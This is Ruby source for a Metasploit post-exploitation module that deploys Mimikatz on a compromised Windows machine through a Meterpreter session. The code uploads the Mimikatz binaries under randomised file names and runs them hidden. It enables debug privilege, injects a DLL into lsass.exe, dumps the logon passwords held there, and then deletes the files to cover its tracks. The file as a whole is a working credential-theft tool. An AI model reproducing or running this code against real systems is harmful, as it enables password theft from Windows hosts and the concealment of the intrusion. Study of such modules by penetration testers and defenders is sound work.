require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

        def initialize(info={})
                super( update_info( info,
                        'Name'          => 'Mimikatz',
                        'Description'   => %q{
				This module will upload the mimikatz executables to the target and retrieve passwords stored in lsass.exe.
                        },
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Matt Andreko "hostess"' ],
                        'Version'       => '$Revision: 14976 $',
                        'Platform'      => [ 'windows' ],
                        'SessionTypes'  => [ 'meterpreter' ],
                        'References'    => [
                                [ 'URL', 'http://blog.gentilkiwi.com/mimikatz' ]
                        ],
                        'DisclosureDate'=> "Dec 31, 2010"
                ))

                register_options([
#                        OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
#                        OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
                ])

        end

	def run

		sysinfo = session.sys.config.sysinfo

		#
		# Upload mimikatz.exe and sekurlsa.dll
		#

		# randomize the filenames
                exe_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
		dll_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".dll"

		# path to the mimikatz binaries
                path = ::File.join(Msf::Config.install_root, "data", "post")
		tmpdir = session.fs.file.expand_path("%TEMP%")

		# decide, x86 or x64
                mexe = nil
		mdll = nil
                if sysinfo["Architecture"] =~ /wow64/i
                        mexe = ::File.join(path, "mimikatz-x64.exe")
			mdll = ::File.join(path, "sekurlsa-x64.dll")
                else
                        mexe = ::File.join(path, "mimikatz-x86.exe")
			mdll = ::File.join(path, "sekurlsa-x86.dll")
                end

		begin
			session.fs.file.upload_file("#{tmpdir}\\#{exe_filename}", mexe)
			session.fs.file.upload_file("#{tmpdir}\\#{dll_filename}", mdll)

			print_status("Mimikatz executables being uploaded..")
		rescue ::Exception => e
                        print_error("Error uploading files: #{e.class} #{e}")
                        return
                end

		#
		# Execute mimikatz
		#

		print_status("Executing %TEMP%\\#{exe_filename}")
		r = session.sys.process.execute("cmd /c \"#{tmpdir}\\#{exe_filename}\"", nil, {'Hidden' => true, 'Channelized' => true})

		#print_status(r.channel.read)
		r.channel.read
		r.channel.write("privilege::debug\n")
		
		#print_status(r.channel.read)
		r.channel.read
		r.channel.write("inject::process lsass.exe \"#{tmpdir}\\#{dll_filename}\"\n")
		
		#print_status(r.channel.read)
		r.channel.read
                r.channel.write("@getLogonPasswords\n")
		#while(d = r.channel.read)
		#	print_status(d)
		#end
		#print_status(r.channel.read)
		r.channel.read
		print_status(r.channel.read)
		r.channel.write("exit\n")
			
		# delete the uac bypass payload
                delete_exe = "cmd.exe /c del \"#{tmpdir}\\#{exe_filename}\""
		delete_dll = "cmd.exe /c del \"#{tmpdir}\\#{dll_filename}\""	
                session.sys.process.execute(delete_exe, nil, {'Hidden' => true})
		session.sys.process.execute(delete_dll, nil, {'Hidden' => true})



	end

end
